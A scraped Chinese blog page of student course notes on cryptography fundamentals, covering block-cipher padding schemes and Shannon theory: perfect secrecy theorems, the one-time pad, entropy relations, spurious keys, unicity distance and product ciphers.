<h1 id="短块处理"><a href="#短块处理" class="headerlink" title="短块处理"></a>短块处理</h1><p>通用方法：填充（padding）（当明文长度为分组长度的整数倍时，仍然需要添加一整个填充块）</p>
<ul>
<li>pkcs#5/pkcs#7：最大分组长度为不小于8/256字节，缺失几个字节填充几遍填充字节数量</li>
<li>PKCS7填充法：FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</li>
<li>X923填充法：FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</li>
<li>ISO 10126填充：FF FF FF FF FF FF FF FF FF 7D 2A 75 EF F8 EF 07</li>
<li>一种特殊方法</li>
<li>自主指定，None，Zeros</li>
<li><p>避免使用padding造成数据长度的扩充CTS（CipherText Stealing，密文挪用）</p>
</li>
<li><p>工作模式安全性依赖于算法本身的安全性</p>
</li>
<li>常用工作模式的比较：分组密码算法的作用、随机数的不可预测性、计数器的新鲜性、并行性、错误传播</li>
<li>短块处理：填充、密文挪用</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%BA%8C%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">密码学基础 Chapter 2——香农理论（二）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:57:25" itemprop="dateCreated datePublished" datetime="2023-02-28T22:57:25+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-02 16:41:13" itemprop="dateModified" datetime="2023-03-02T16:41:13+08:00">2023-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">密码学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="九、密码学中的熵关系"><a href="#九、密码学中的熵关系" class="headerlink" title="九、密码学中的熵关系"></a>九、密码学中的熵关系</h2><h3 id="定理2-10"><a href="#定理2-10" class="headerlink" title="定理2.10"></a>定理2.10</h3><p>设$(P,C,K,E,D)$是一个密码体制，那么有$H(K|C)=H(K)+H(P)-H(C)$<br>即截获密文后，密钥的熵等于明文的熵加密钥的熵减密文的熵（密钥含糊度）</p>
<p>证明：<br>由定理2.8：$H(K|C)=H(KC)-H(C)$<br>明文与密钥之间没有任何统计规律，故有$H(KP)=H(K)+H(P)$<br>由密码体制的性质，当明文和密钥已知时，密文也随之确定，则有$H(C|KP)=0$（信息量为0）<br>同理当密文与密钥已知时，明文也随之确定，故$H(P|KC)=0$<br>由定理2.8：$H(PKC)=H(P|KC)+H(KC)=H(KC),H(CKP)=H(C|KP)+H(KP)=H(KP)$<br>故有$H(KC)=H(KP)=H(K)+H(P)$<br>故$H(K|C)=H(K)+H(P)-H(C)$，证毕。</p>
<h3 id="一般密码体制与熵有关的性质"><a href="#一般密码体制与熵有关的性质" class="headerlink" title="一般密码体制与熵有关的性质"></a><font color=red>一般密码体制与熵有关的性质</font></h3><ol>
<li>$|P|\le|C|$（从明文空间到密文空间必为单射）</li>
<li>$H(P|KC)=H(C|KP)=0$（见定理2.10证明部分）</li>
<li>$H(PK)=H(P)+H(K)$（见定理2.10证明部分）</li>
<li>定理2.10结论</li>
<li>$H(P)\le H(C)\le H(P)+H(K)$（$H(K|C)\le H(K)$，由定理2.10推出）</li>
<li>$H(P|C)\le H(K|C)$</li>
</ol>
<p>推论：若$|P|=|C|$，且P随机等概率分布，则C一定随机等概率分布。此时$H(K|C)=H(K)$<br>对于完善保密体制，还有下面的性质：</p>
<ol>
<li>$H(P|C)=H(P)$</li>
<li>$|P|\le |C|\le |K|(Pr[y|x]=Pr[y]&gt;0)$</li>
<li>$H(P)\le H(C)\le H(K)$</li>
</ol>
<p>6.证明： </p>
<script type="math/tex; mode=display">H(K|C)=H(KC)-H(C),H(P|C)=H(PC)-H(C)\\
即证H(KC)\ge H(PC)\\
H(KPC)=H(PC)+H(K|PC)=H(KC)+H(P|KC)\\
H(P|KC)=0,H(K|PC)>0\Rightarrow H(KC)\ge H(PC)</script><p>9.证明：密钥随机等概率分布且由8可知，$H(C)\le H(K)$<br>$H(P)=H(P|KC)+H(PK)+H(CP|K)=H(C|K)\le H(C)$(???)</p>
<p><img src="1.jpeg" alt=""><br><img src="2.png" alt=""><br><img src="3.png" alt=""><br>上图中：<br>绿+紫=$I(X;Y)$；蓝+紫=$I(Y;Z)$；青+紫=$I(X;Z)$<br>绿=$I(X;Y|Z)$；蓝=$I(Y;Z|X)$；青=$I(X;Z|Y)$<br>红=$H(X|YZ)$；橙=$H(Y|XZ)$；黄=$H(Z|XY)$<br>紫=$I(X;Y;Z)$<br>红+青=$H(X|Y)$；橙+蓝=$H(Y|X)$；<br>红+绿=$H(X|Z)$；黄+蓝=$H(Z|X)$；<br>橙+绿=$H(Y|Z)$；黄+青=$H(Z|Y)$；<br>除黄所有=$H(XY)$；除红所有=$H(YZ)$；除橙所有=$H(XZ)$<br>青+紫+蓝=$I(XY;Z)$；绿+紫+蓝=$I(XZ;Y)$；绿+紫+青=$I(YZ;X)$<br>红+绿+橙=$H(XY|Z)$；红+青+黄=$H(XZ|Y)$；橙+蓝+黄=$H(YZ|X)$</p>
<h2 id="十、伪密钥"><a href="#十、伪密钥" class="headerlink" title="十、伪密钥"></a>十、伪密钥</h2><p>明文串每个分组使用同一个密钥加密得到密文串，考虑唯密文攻击方式，明文为某自然语言时，分析者可以排除某些密钥，但依然存在多个密钥使得明密文满足加解密函数时，其中只有一个密钥是正确的。称其他那些可能但不正确的密钥为伪密钥。（如移位密码对于不同的密钥有不同语义的单词明文出现）<br>（获得同一密钥加密的密文越长，存在伪密钥的可能性越小）</p>
<h2 id="十一、自然语言的熵"><a href="#十一、自然语言的熵" class="headerlink" title="十一、自然语言的熵"></a>十一、自然语言的熵</h2><p>有随机符号序列$X=X_1X_2…X_n$，其中$X_i\in \{x_1,x_2,…,x_m\}$<br><strong>单符号信源</strong>：仅有一个信号的信源，信号的种类服从一个概率分布。<br><strong>多符号信源</strong>：有多个符号的信源。<br><strong>非平稳信源</strong>——相同字符在不同位置的统计规律也不同：</p>
<script type="math/tex; mode=display">H(X_1X_2...X_n)=H(X_1)+H(X_2|X_1)+H(X_3|X_2X_1)+...+H(X_n|X_1X_2...X_{n-1})</script><p>若各维联合概率分布与时间起点无关，则称为<strong>离散平稳信源</strong>。有</p>
<script type="math/tex; mode=display">H(X_iX_{i+1}...H(X_{i+n-1}))=H(X_jX_{j+1}...X_{j+n-1})</script><p><strong>无记忆信源</strong>：每个符号统计独立，其熵值等于每个符号的熵之和。<br><strong>有记忆信源</strong>：每个符号的统计规律有一定的关联<br>极限熵：当序列长度趋近于无穷大时，其中每一个字符的平均熵值：</p>
<script type="math/tex; mode=display">H_{\infty}=\lim_{n\rightarrow\infty}\frac{1}{n}H(X_1X_2...X_n)=\lim_{n\rightarrow\infty}\frac{1}{n}H(X_n|X_1X_2...X_{n-1})</script><p><strong>马尔可夫信源</strong>：如果x~i~只与前面的m个信号（x~i-1~，…，x~i-m~）相关，则称为马尔可夫信源</p>
<script type="math/tex; mode=display">H(X_n|X_1X_2...X_{n-1})=H(X_n|X_1X_2...X_{n-m})</script><p>若英语中每个字母是随机使用的，则其熵$H_0=\log_226=4.7$。但实际上根据每个英文字母在英文中出现的概率计算，英文字母的熵为4.19。随着统计字母组的长度增加，字母平均熵值呈下降趋势，当长度达到一定量时，熵值趋于稳定。</p>
<p>若定义$P^n$为n字母序列的概率分布构成的随机变量，则$H(P^n)$表示以n个字母为统计对象的熵值，其除以n表示以n个字母为统计对象时，单字母的平均熵<br>定义<strong>自然语言L的熵</strong>为$H_L=\lim_{n\rightarrow\infty}\frac{H(P^n)}{n}$<br>统计得出大概范围为1.0~1.5，取1.25</p>
<p><strong>自然语言冗余度</strong>：</p>
<script type="math/tex; mode=display">R_L=1-\frac{H_L}{\log_2|P|}=\frac{H_0-H_L}{H_0}</script><p>其中$H_0-H_L$称为语言冗余<br>英语约为0.75</p>
<p><strong>唯一解距离</strong>：使得伪密钥期望值为0所需要的密文分组数量，即在给定足够的计算时间下分析者能够唯一计算出密钥所需明文的平均数量。</p>
<script type="math/tex; mode=display">H(K|C^n)=H(K)+H(P^n)-H(C^n)\\.
H(P^n)=nH_L(P)=n(1-R_L)\log_2|P|,H(C^n)\le n\log_2|C|\\
H(K|C^n)\ge\log_2|K|-nR_L\log_2|P|</script><p>令$H(K|C^n)=0$得</p>
<script type="math/tex; mode=display">n\ge \frac{\log_2|K|}{R_L\log_2|P|}</script><p>唯一解距离$n_0=\frac{\log_2|K|}{R_L\log_2|P|}$</p>
<h2 id="十二、乘积密码体制"><a href="#十二、乘积密码体制" class="headerlink" title="十二、乘积密码体制"></a>十二、乘积密码体制</h2><p>对于两个密码体制$S_1,S_2$，其明文空间和密文空间相同（内嵌式密码体制），$S_1=(P,P,K_1,E_1,D_1),S_2=(P,P,K_2,E_2,D_2)$，则$S_1$和$S_2$的乘积密码体制定义为$S_1\times S_2=(P,P,K_1\times K_2,E,D)$</p>
<script type="math/tex; mode=display">e_{(k_1,k_2)}(x)=e_{k_2}(e_{k_1}(x))\\
d_{(k_1,k_2)}(x)=d_{k_1}(d_{k_2}(x))</script><p>（实际上就是将明文先用S~1~加密后再用S~2~加密。）</p>
<h3 id="幂等密码体制"><a href="#幂等密码体制" class="headerlink" title="幂等密码体制"></a>幂等密码体制</h3><p>使用一个密码体制将明文加密两次即为S^2^，加密n次则为S^n^。<br>若S^2^=S则称该密码体制幂等，与自身做乘积无法提高算法安全性。<br>古典密码中的移位、代换、乘法、仿射、置换、维吉尼亚、希尔密码均为幂等。<br><strong>若S~1~和S~2~为幂等的且为可交换的，则$S_1\times S_2$也是幂等的</strong><br>如果密码体制不是幂等的，那么可以通过与自身作多次乘积运算（迭代）来提高安全性（<strong>注意</strong>：这里的相等定义要注意，不是说<del>选择一个密钥，将一个明文加密两次和加密一次得到的密文相等</del>）<br>一种构造简单非幂等密码体制的方法是对两个不同的简单密码体制做乘积（必须保证两个密码体制不是可交换的）</p>
<p><strong>证明两个内嵌式密码体制相等的方法：首先二者的明文空间相同，其次存在一个双射函数使两者密钥空间中的密钥一一对应相等。（两个密钥空间相互包含也可证明两密钥空间相等）[K相等且同分布]</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-2%E2%80%94%E2%80%94%E9%A6%99%E5%86%9C%E7%90%86%E8%AE%BA%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">密码学基础 Chapter 2——香农理论（一）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:56:51" itemprop="dateCreated datePublished" datetime="2023-02-28T22:56:51+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:18" itemprop="dateModified" datetime="2023-03-01T11:31:18+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">密码学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Chapter-2-Shannon理论"><a href="#Chapter-2-Shannon理论" class="headerlink" title="Chapter 2 Shannon理论"></a>Chapter 2 Shannon理论</h1><p>评价密码体制的安全性：</p>
<pre><code>- 计算安全性：从计算上衡量密码体制的安全性
- 可证明安全性：通常使用规约法证明方案安全性
- 无条件安全：提供无限计算资源也无法攻破
</code></pre><p>上面三种安全性依次递增。</p>
<h2 id="一-密文概率"><a href="#一-密文概率" class="headerlink" title="一. 密文概率"></a>一. 密文概率</h2><p>在密文中出现某一个字符的概率，与明文分布和密钥分布决定，即$P(Y=y)$可以由$P(X=x),P(K=k)$推导</p>
<p>推广公式为：（全概率公式应用）</p>
<script type="math/tex; mode=display">P(Y=y)=\sum_{k:y\in C(k)}P(K=k)P(X=d_k(y))</script><p><strong>若密钥K随机等概率获取，则密文C不一定随机等概率。因为明文出现的概率未知。</strong><br><strong>若密文C等概率获取，则明文P不一定随机等概率。如下例：</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">a</th>
<th style="text-align:center">b</th>
<th style="text-align:center">c</th>
<th style="text-align:center">d</th>
<th style="text-align:center">e</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">k1</td>
<td style="text-align:center">e</td>
<td style="text-align:center">d</td>
<td style="text-align:center">c</td>
<td style="text-align:center">b</td>
<td style="text-align:center">a</td>
</tr>
<tr>
<td style="text-align:center">k2</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center">c</td>
<td style="text-align:center">d</td>
<td style="text-align:center">e</td>
</tr>
</tbody>
</table>
</div>
<script type="math/tex; mode=display">Pr[a]=0.1, Pr[b]=0.15, Pr[c]=0.2, Pr[d]=0.25, Pr[e]=0.3\\
Pr[k1]=Pr[k2]=0.5</script><p>密文等概率，但明文并不随机等概率</p>
<font color=red>**若明文P随机等概率获取，则密文C不一定随机等概率。证明如下：**
如果$|P|=|C|$则一定等概率，否则不一定。
证明：
首先证明当$|P|=|C|$时，密文一定随机等概率
对于任意一密文字符$c\in C$，设密钥空间$K$中密钥$k_i$的概率为$t_i$，设$e_i(x_{j})=y_k$，所有明文字符取值概率均为$p$。由于对于任意$k_i\in K$，$|C|\rightarrow |P|$是一个双射，因此给定$k,\forall y\in C,\exist x\in P,e_k(x)=y$，即$\forall y\in C,\forall k\in K,\exist x\in P,e_k(x)=y$。故
$$Pr[y=y_k]=\sum_K k_ix_{j}=\sum_K k_ip=p$$
故所有密文字符取值概率相等。
当$|P|\ne |C|$时，举出以下反例：
||a|b|c|
|:-:|:-:|:-:|:-:|
|k1|1|2|5|
|k2|4|5|6|

</font>

<font color=red>理解的关键在于此时$C\rightarrow P$不再是双射，对于一个密文可能不存在k能使其解密为任何一个明文，上面的算式就不成立了。</font>

<h2 id="二-完善保密性"><a href="#二-完善保密性" class="headerlink" title="二. 完善保密性"></a>二. 完善保密性</h2><p>一个密码具有完善保密性的必要条件：分析者无法通过观察密文得到明文。</p>
<p>单表代换密码不具有完善保密性，原因是明文和密文具有相同的概率分布特性。</p>
<p>定义：一个密码体制具有完全保密性，如果对于任意$x\in P$和$y \in C$，都有$Pr[x|y]=Pr[x]$，即密文字符随机变量与明文字符随机变量独立（或说明文x的后验概率等于其先验概率）</p>
<p>后验概率通过贝叶斯公式计算：</p>
<script type="math/tex; mode=display">P(x|y)=\frac{P(xy)}{P(y)}
=\frac{P(xy)}{\sum_{x_i\in X} P(x_i)P(y|x_i)}
=\frac{P(x)P(y|x)}{\sum_{x_i\in X} P(x_i)P(y|x_i)}
=\frac{P(x)\sum_{\{k:x=d_k(y)\}}P(K=k)}{\sum_{k:y\in C(k)} P(K=k)P(X=d_k(y))}</script><p>解释一下上式：<br>通过贝叶斯公式易得第三个等号后的式子，对于最后一个式子的变形：首先看分子，它表示明文字符为x且密文字符为y的概率。满足这种条件的密钥可能不止一个，因此可以将$P(y|x)$改写为满足这种条件的密钥的总概率，即$\sum_{\{k:x=d_k(y)\}}P(K=k)$。对于分母，它表示密文字符y的出现概率，对于每一个密钥，其都对应一个明文字符，使得该明文字符加密后成为该密钥字符y。因此可以将分母改写为密钥概率乘以对应明文出现概率。</p>
<p>定义的含义：</p>
<ol>
<li>明文x和对应密文y具有统计独立关系</li>
<li>明密文之间的互信息$I(x,y)=0$（类似于相关系数）</li>
<li>攻击者分析y的统计规律无法推导出x</li>
</ol>
<p><strong>例：对于下面的加密系统，判断是否完善保密。</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">a</th>
<th style="text-align:center">b</th>
<th style="text-align:center">c</th>
<th style="text-align:center">d</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">k1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">k2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
<td style="text-align:center">4</td>
<td style="text-align:center">5</td>
</tr>
<tr>
<td style="text-align:center">k3</td>
<td style="text-align:center">3</td>
<td style="text-align:center">4</td>
<td style="text-align:center">5</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">k4</td>
<td style="text-align:center">4</td>
<td style="text-align:center">5</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">k5</td>
<td style="text-align:center">5</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
</tr>
</tbody>
</table>
</div>
<p>其中$Pr[a]=\frac{1}{2},Pr[b]=\frac{1}{4},Pr[c]=Pr[d]=\frac{1}{8}$，密钥等概率。</p>
<p><strong>解：</strong> 计算略，完善保密。因为每一个明文被加密为任何一个密文的概率相等，因此对于每一个密文，其对应的明文为x的概率即为明文出现的概率。</p>
<h2 id="三、完善保密性相关定理"><a href="#三、完善保密性相关定理" class="headerlink" title="三、完善保密性相关定理"></a>三、完善保密性相关定理</h2><font color=red>定理1：假设移位密码的26个密钥以相同概率随机使用，对于任意的明文概率分布，移位密码都具有完善保密性。</font>

<p>证明：</p>
<p>要证明完善保密性，即证明对于任意$x\in P$和$y \in C$，都有$Pr[x|y]=Pr[x]$，其等价于对于任意$x\in P$和$y \in C$，都有$Pr[y|x]=Pr[y]$。由于明文概率未知，因此$Pr[x]$无法确定，故证明其等价命题。</p>
<p>由全概率公式：<br>$Pr[y]=\sum_{k\in Z_{26}}Pr[K=k]Pr[X=d_k(y)=(y-k)\mod 26]\\<br>=\frac{1}{26}\sum_{k\in Z_{26}}Pr[X=(y-k)\mod 26]\\<br>=\frac{1}{26}$</p>
<p>$Pr[y|x]=Pr[K=(y-x)\mod 26]=\frac{1}{26}$</p>
<p>证毕。</p>
<font color=red>定理2：假设密码体制$(P,C,K,E,D)$满足$|K|=|C|=|P|$（$|K|\ge |C|\ge |P|$是完全保密的必要条件）。这个密码体制是完善保密的，当且仅当每个密钥被使用的概率相等，均为$\frac{1}{|K|}$，且对于任意$x\in P,y\in C$，均存在唯一密钥$k$，使得$e_k(x)=y$。</font>

<p>证明：</p>
<p>充分性：见定理1的证明</p>
<p>必要性：该密码体制具有完全保密性，故$Pr[y|x]=Pr[y]$，这表示对于任意的$x\in P,y\in C$均存在$k\in K$使得$e_k(x)=y$（否则$Pr[y|x]=0$，与$Pr[y]&gt;0$矛盾）<br>又如果存在有两个$k_1,k_2\in K$，均有$e_k(x)=y$，由于|C|=|K|，则就存在有$y^<em>\in C$，不存在$k\in K$，使得$e_k(x)=y^</em>$，与$Pr[y]&gt;0$矛盾<br>故对于一个确定的$x\in P$，能够建立双射$Q:K\rightarrow C$，$Q(k)=y$表示$k(x)=y$。</p>
<font color=blue>k不变时，x与y对应证法</font>
由于$Pr[y|x]=Pr[y]$，对于确定的$x$，$Pr[y|x]=Pr[k\in K:e_k(x)=y]=Pr[y]$。如果改变x的值，可以得到：对于确定的k，有$Pr[k]=Pr[y_1]=Pr[y_2]=...=Pr[y_n]$，对于每个$k$均是如此，故密钥取值概率相等，均为$\frac{1}{|K|}$

<font color=blue>y不变时，x与k对应证法</font>
由贝叶斯公式：
$$Pr[x_i|y]Pr[y]=Pr[y|x_i]Pr[x_i]\Rightarrow Pr[y]=Pr[y|x_i]=Pr[k\in K:e_k(x_i)=y]$$
遍历x时，也能够遍历k。故所有密钥概率均为$Pr[y]$

## 四、一次一密密码体制

定义：
$P=C=K=(Z_2)^n$
$e_k(x)=(x_1+k_1,x_2+k_2,...,x_n+k_n)\mod 2$
$d_k(x)=(y_1+k_1,y_2+k_2,...,y_n+k_n)\mod 2$
可根据定理2证明其完善保密性。

## 五、完善保密性判定定理

假设密钥只使用一次

<font color=red>定理1：对密码体制$(P,C,K,E,D)$，若对于任意$x\in P,y\in C$，有$\sum_{k:x=d_k(y)}Pr[k]=\frac{1}{|P|}$，则该密码完善保密。</font>

<p>证明：</p>
<p>$Pr[y|x]=\sum_{k:y=e_k(x)}Pr[k]=\frac{1}{|P|}$<br>由全概率公式：$Pr[y]=\sum_{k:y=e_k(x)}Pr[x]Pr[y|x]=\frac{1}{|P|}$</p>
<font color=blue>深层理解：定理1与定理4的区别是：定理1的条件是充分条件，但无需满足$|P|=|C|$的条件。如果$|P|\ne |C|$，上述结论仍可能成立，唯一的区别是$Pr[y|x]=Pr[y]\ne \frac{1}{|P|}$。由密码体系定义可知，对于任何密码系统，均有$|P|\le|C|$。对于给定的$x\in P$，由全概率公式可知：$Pr[x]=\sum_{y_i\in C} Pr[y_i]Pr[x|y_i]=\sum_{y_i\in C}Pr[y]Pr[k:e_k(x)=y_i]$，易得此时$Pr[y_i]$不可能恒为$\frac{1}{|P|}$，否则$\sum_C Pr[y_i]>1$，这显然不可能。</font>

<hr>
<font color=red>定理2：对于密码体制$(P,C,K,E,D)$，$K$等概率选取，若对于任意的$x\in P,y\in C,|{k:x=d_k(y)}|=\frac{|K|}{|P|}$，则该密码体制完善保密。</font>

<p>证明：</p>
<p>$Pr[y|x]=\sum Pr[k:x=d_k(y)]=\frac{1}{|K|}\cdot \frac{|K|}{|P|}=\frac{1}{|P|}$<br>$Pr[y]=\sum_{x_i\in P} Pr[x_i]Pr[y|x_i]=\frac{1}{|P|}$</p>
<font color=blue>深层理解：定理2与定理3的区别于定义1和定理4的区别类似，没有限定$|P|=|C|$。如果二者不等，则存在有密码体制满足$|{k:x=d_k(y)}|\ne\frac{|K|}{|P|}$，但也满足上述结论。当其等于$\frac{|K|}{|C|}$时易证其也成立。</font>

<hr>
<font color=red>定理3：对于密码体制$(P,C,K,E,D)$，$|P|=|C|$，$K$等概率选取，当且仅当对于任意的$x\in P,y\in C,|{k:x=d_k(y)}|=\frac{|K|}{|P|}$，该密码体制完善保密。</font>

<p>证明：充分性已证明。<br>必要性：若该密码体制具有完全保密性，则$Pr[y]=Pr[y|x]$，由于$K$等概率选取，因此对于任意$x\in P,y\in C$有$|{k:x=d_k(y)}|$均相等。由于此时$|P|=|C|$,因此对于给定的$x$，可将$k$分为数量相等（均为$|{k:x=d_k(y_i)}|$）的$|C|$份，每一份中的$k$加密$x$均可得到相同的$y$，不同份中的$k$加密$x$得到不同的$y$。因此显然有$|{k:x=d_k(y)}|=\frac{|K|}{|P|}$</p>
<hr>
<font color=red>定理4：对于密码体制$(P,C,K,E,D)$，$|P|=|C|$，且明文$|P|$等概率选取。当且仅当对于任意$x\in P,y\in C$，有$\sum_{k:x=d_k(y)}Pr[k]=\frac{1}{|P|}$，该密码体制完善保密。</font>

<p>证明：充分性已证明。<br>必要性：$Pr[y]=\sum Pr[k_i]Pr[x_j]=\frac{1}{|P|}\sum Pr[k_i]=\frac{1}{|P|}$</p>
<font color=blue>深层理解：这里需要两个条件，一个是明文空间和密文空间元素个数相等，另一个是明文等概率选取。如果明文不等概率会怎样呢？此时必要性就无法成立，那能否举一个不满足此充分条件又能够使结论成立的条件呢？。设第一个条件仍然成立，$x_i$的出现的概率为$Pr[x_i]$，此时证明$Pr[x]=Pr[x|y]$。对于给定的$x^*\in P$，$Pr[x^*]$已知，设为$P$，那么$Pr[x^*|y]=\frac{Pr[x^*y]}{Pr[y]}=\frac{\sum Pr[k:x^*=d_k(y)]Pr[x^*]}{Pr[y]}=P$。要使得$Pr[x^*|y]=Pr[x^*]$，则有$Pr[y]=\sum Pr[k:x^*=d_k(y)]$，即对于任意密文字符$y$，其出现的概率均等于能够将$y$解密为$x^*$的全部密钥的出现概率。</font>

<h2 id="六、-自信息量"><a href="#六、-自信息量" class="headerlink" title="六、 自信息量"></a>六、 自信息量</h2><ul>
<li>信息量<ul>
<li>对信息的直观认识<ul>
<li>信道上传送随机变化的值</li>
<li>时间发生概率与信息量的关系</li>
<li>消息间的依赖关系与相互之间的信息量</li>
<li>信息消除不确定性</li>
<li>信息可加</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>自信息量<br>单符号离散信源的数学模型可用一位随机变量$X$的概率空间描述，即每个$x\in X$均对应一个概率$p(x_i)$，如果信源发出消息$x_i$的概率为$p(x_i)$，则其能提供的自信息量（自信息）为：（式中的底数可以换，这里由于使用比特作为信息媒介，因此使用2作为底数。如果使用10进制数字，则就应使用10作为底数，即底数由媒介的可能取值数决定）<script type="math/tex; mode=display">I(x_i)=\log_2\frac{1}{p(x_i)}=-\log_2p(x_i)</script>理解：信源发出信号前信宿对消息的不确定，信源发出信息后提供给信宿的信息量，即消除不确定性所需要的信息量。如可能的情况一共8种，那么自然需要3个比特才能表示所有状态，能够确定这个信息属于什么状态。</li>
</ul>
<ul>
<li><p>$I(x_i)$的性质：</p>
<ul>
<li>非负</li>
<li>$P(x_i)=1$时$I(x_i)=0$</li>
<li>$P(x_i)=0$时$I(x_i)=+\infty$</li>
<li>是$p(i)$的单调递减函数</li>
</ul>
</li>
<li><p>联合自信息量</p>
<ul>
<li>涉及多个随机变量$X_i$，其中每一个联合事件均有一个概率</li>
<li>$I(x_1x_2…x_n)=-\log_2p(x_1x_2…x_n)$</li>
